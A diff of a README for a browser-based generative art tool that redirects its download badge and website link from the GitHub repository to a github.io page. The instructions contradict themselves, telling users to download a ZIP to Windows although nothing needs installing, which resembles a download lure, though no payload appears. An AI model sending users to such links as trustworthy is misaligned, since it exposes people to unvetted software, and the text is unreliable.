@@ -1,6 +1,6 @@
 # 🎨 ChaotiColor-Generative-Art - Create unique art with simple tools
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bromusjaponicusotoe673/ChaotiColor-Generative-Art)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://bromusjaponicusotoe673.github.io)
 
 ChaotiColor creates complex, colorful patterns using simple mathematical rules. This software uses cellular automata to generate designs that look like fabric prints or modern graphics. You need no prior design experience to create professional-looking art. The program runs entirely in your web browser, which means you do not need to install complicated software on your computer.
 
@@ -12,7 +12,7 @@ You only need a modern web browser to run this tool. This includes Google Chrome
 
 You do not need to compile code or install heavy packages. Follow these steps to open the application:
 
-1. Visit the project website here: [https://github.com/bromusjaponicusotoe673/ChaotiColor-Generative-Art](https://github.com/bromusjaponicusotoe673/ChaotiColor-Generative-Art)
+1. Visit the project website here: [https://bromusjaponicusotoe673.github.io](https://bromusjaponicusotoe673.github.io)
 2. Locate the button labeled Code on the right side of the screen.
 3. Select Download ZIP from the dropdown menu.
 4. Open your Downloads folder on your Windows computer.
